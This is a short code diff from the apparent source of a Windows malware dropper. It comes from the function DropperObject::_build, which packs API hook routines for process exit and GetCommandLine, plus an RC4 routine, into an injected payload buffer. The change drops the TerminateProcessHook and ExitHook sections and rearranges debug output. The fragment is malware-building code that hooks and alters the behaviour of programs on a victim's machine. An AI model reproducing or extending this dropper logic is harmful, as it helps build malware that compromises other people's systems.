@@ -170,28 +170,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	// ExitProcessHook code
 	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
-	
-	// TerminateProcessHook data
-	*((DWORD*) ptr) = ptr - _data.get();
-	ptr += sizeof(DWORD);
-	END_MARKER(ptr);
-	
-	// TerminateProcessHook code
-	ptr += _embedFunction((PVOID)TerminateProcessHook, (PVOID)TerminateProcessHook_End, header->functions.terminateProcessHook, ptr);
-	cout << "TerminateProcessHook is " << header->functions.terminateProcessHook.size << " bytes long, offset " << header->functions.terminateProcessHook.offset << endl;
-	
-	// ExitHook data
-	*((DWORD*) ptr) = ptr - _data.get();
-	ptr += sizeof(DWORD);
-	END_MARKER(ptr);	
-	
-	
-	// ExitHook code
-	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
-	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
-	
-
-	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
+		
 	// GetCommandLineAHook data
 	*((DWORD*) ptr) = ptr - _data.get();
 	ptr += sizeof(DWORD);
@@ -199,7 +178,8 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 
 	// GetCommandLineAHook code
 	ptr += _embedFunction((PVOID)GetCommandLineAHook, (PVOID)GetCommandLineAHook_End, header->functions.GetCommandLineAHook, ptr);
-
+	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineAHook: " << std::hex << GetCommandLineAHook << endl;
+	
 	// GetCommandLineWHook data
 	*((DWORD*) ptr) = ptr - _data.get();
 	ptr += sizeof(DWORD);
@@ -207,8 +187,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	
 	// GetCommandLineWHook code
 	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
-
-
+	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
 	// RC4 code
 	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
